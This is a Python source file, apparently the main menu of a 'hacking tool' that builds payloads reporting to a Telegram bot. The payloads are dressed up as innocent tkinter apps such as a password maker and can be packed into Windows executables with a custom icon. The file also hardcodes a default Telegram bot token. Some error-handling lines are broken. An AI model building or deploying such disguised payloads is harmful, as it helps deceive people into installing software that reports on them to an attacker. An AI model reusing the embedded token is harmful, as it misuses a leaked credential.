from colorama import init, Fore, Style
import requests
from modules import make
from json import loads
import os

init()
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def banner():
    from random import randint
    banners = [r"""

          _____                            _____                        _____                            _____  
         /\    \                          /\    \                      /\    \                          /\    \ 
        /::\____\                        /::\    \                    /::\    \                        /::\____\
       /::::|   |                       /::::\    \                   \:::\    \                      /:::/    /
      /:::::|   |                      /::::::\    \                   \:::\    \                    /:::/    / 
     /::::::|   |                     /:::/\:::\    \                   \:::\    \                  /:::/    /  
    /:::/|::|   |                    /:::/__\:::\    \                   \:::\    \                /:::/    /   
   /:::/ |::|   |                    \:::\   \:::\    \                  /::::\    \              /:::/    /    
  /:::/  |::|___|______            ___\:::\   \:::\    \                /::::::\    \            /:::/    /     
 /:::/   |::::::::\    \          /\   \:::\   \:::\    \              /:::/\:::\    \          /:::/    /      
/:::/    |:::::::::\____\        /::\   \:::\   \:::\____\            /:::/  \:::\____\        /:::/____/       
\::/    / ~~~~~/:::/    /        \:::\   \:::\   \::/    /           /:::/    \::/    /        \:::\    \       
 \/____/      /:::/    /          \:::\   \:::\   \/____/           /:::/    / \/____/          \:::\    \      
             /:::/    /            \:::\   \:::\    \              /:::/    /                    \:::\    \     
            /:::/    /              \:::\   \:::\____\            /:::/    /                      \:::\    \    
           /:::/    /                \:::\  /:::/    /            \::/    /                        \:::\    \   
          /:::/    /                  \:::\/:::/    /              \/____/                          \:::\    \  
         /:::/    /                    \::::::/    /                                                 \:::\    \ 
        /:::/    /                      \::::/    /                                                   \:::\____\ 
        \::/    /                        \::/    /                                                     \::/    /
         \/____/                          \/____/                                                       \/____/ 
                                                                                                                    
""", """
                                                                                                                
MMMMMMMM               MMMMMMMM        SSSSSSSSSSSSSSS      TTTTTTTTTTTTTTTTTTTTTTT     LLLLLLLLLLL             
M:::::::M             M:::::::M      SS:::::::::::::::S     T:::::::::::::::::::::T     L:::::::::L             
M::::::::M           M::::::::M     S:::::SSSSSS::::::S     T:::::::::::::::::::::T     L:::::::::L             
M:::::::::M         M:::::::::M     S:::::S     SSSSSSS     T:::::TT:::::::TT:::::T     LL:::::::LL             
M::::::::::M       M::::::::::M     S:::::S                 TTTTTT  T:::::T  TTTTTT       L:::::L               
M:::::::::::M     M:::::::::::M     S:::::S                         T:::::T               L:::::L               
M:::::::M::::M   M::::M:::::::M      S::::SSSS                      T:::::T               L:::::L               
M::::::M M::::M M::::M M::::::M       SS::::::SSSSS                 T:::::T               L:::::L               
M::::::M  M::::M::::M  M::::::M         SSS::::::::SS               T:::::T               L:::::L               
M::::::M   M:::::::M   M::::::M            SSSSSS::::S              T:::::T               L:::::L               
M::::::M    M:::::M    M::::::M                 S:::::S             T:::::T               L:::::L               
M::::::M     MMMMM     M::::::M                 S:::::S             T:::::T               L:::::L         LLLLLL
M::::::M               M::::::M     SSSSSSS     S:::::S           TT:::::::TT           LL:::::::LLLLLLLLL:::::L
M::::::M               M::::::M     S::::::SSSSSS:::::S           T:::::::::T           L::::::::::::::::::::::L
M::::::M               M::::::M     S:::::::::::::::SS            T:::::::::T           L::::::::::::::::::::::L
MMMMMMMM               MMMMMMMM      SSSSSSSSSSSSSSS              TTTTTTTTTTT           LLLLLLLLLLLLLLLLLLLLLLLL
                                                                                                                
""", """

 _______    _______   _________   _       
(       )  (  ____ \  \__   __/  ( \      
| () () |  | (    \/     ) (     | (      
| || || |  | (_____      | |     | |      
| |(_)| |  (_____  )     | |     | |      
| |   | |        ) |     | |     | |      
| )   ( |  /\____) |     | |     | (____/\ 
|/     \|  \_______)     )_(     (_______/
                                          
""", """

.        :        .::::::.     ::::::::::::     :::     
;;,.    ;;;      ;;;`    `     ;;;;;;;;''''     ;;;     
[[[[, ,[[[[,     '[==/[[[[,         [[          [[[     
$$$$$$$$"$$$       '''    $         $$          $$'     
888 Y88" 888o     88b    dP         88,        o88oo,.__
MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM

"""]
    clear()
    print(Fore.CYAN + banners[randint(0, 3)] + Style.RESET_ALL)
def same_banner():
    ban ="""
 _______    _______   _________   _       
(       )  (  ____ \  \__   __/  ( \      
| () () |  | (    \/     ) (     | (      
| || || |  | (_____      | |     | |      
| |(_)| |  (_____  )     | |     | |      
| |   | |        ) |     | |     | |      
| )   ( |  /\____) |     | |     | (____/\ 
|/     \|  \_______)     )_(     (_______/                                       
"""
    print(Fore.CYAN + ban)
def check_update(): 
    try:
        online_version = loads(requests.get("https://raw.githubusercontent.com/Unknow-per/MS-TL-hacking-tool/main/log/version.json").text)
        with open("log/version.json", "r") as file:
            local_version = loads(file.read())
        if online_version["version"] == local_version["version"]: pass
        else: 
            print(Fore.RED + "Please update the program with 'git pull' command.")
            exit()
    except: 
        print(Fore.RED + "Please check your internet connection. Then, try again.")
        exit()
def get_options():
    try: 
        id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
        tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
        if tok == "c":
            token = input("Write your bot token: ")
        else: 
            token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
        if name == "c": 
            name = input("Write your app name(ex: mstl): ")
        else: 
            name = "mstl"
        icon = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome icon write C if not press enter: ")).lower()    
        if icon == "c":
            icon = input("write your icon file address(.ico file): ")
            if icon.endswith(".ico"): pass
        else: 
            icon = "icongallery/icon.ico"
        code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome tkinter code write C if not press enter: ")).lower()    
        if code_addr == "c":
            code_addr = input("write your code address(.py file): ")
            if code_addr.endswith(".py"): pass
        else: 
            code_addr = "builder/tk_payloads/password_maker.py"
        offline_code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
        if offline_code_addr == "c":
            offline_code_addr = input("write your code address(.py file): ")
            if code_addr.endswith(".py"): pass
        else: 
            offline_code_addr = "builder/tk_payloads/offline/no_internet.py"
        platform = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " Choice your platform(windows, linux, mac): ")).lower()
        if platform == "linux": 
            platform = "builder/linux-build.py"
        elif platform == "mac": 
            print(Fore.RED + "Mac payload doesn't exist. Sorry.")
            exit()
        else: 
            platform = "builder/windows-build.py"
        make.make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
        opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
        if opt == "y": 
            make.make_exe(NAME=name, ICON=icon)
        else: 
            exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
    except ValueError: print(Fore.RED + "Invalid input."), exit()
    except KeyboardInterrupt: exit(f"\n\n\{Fore.CYAN}nGood Luck{banner.Style.RESET_ALL}\n\n")
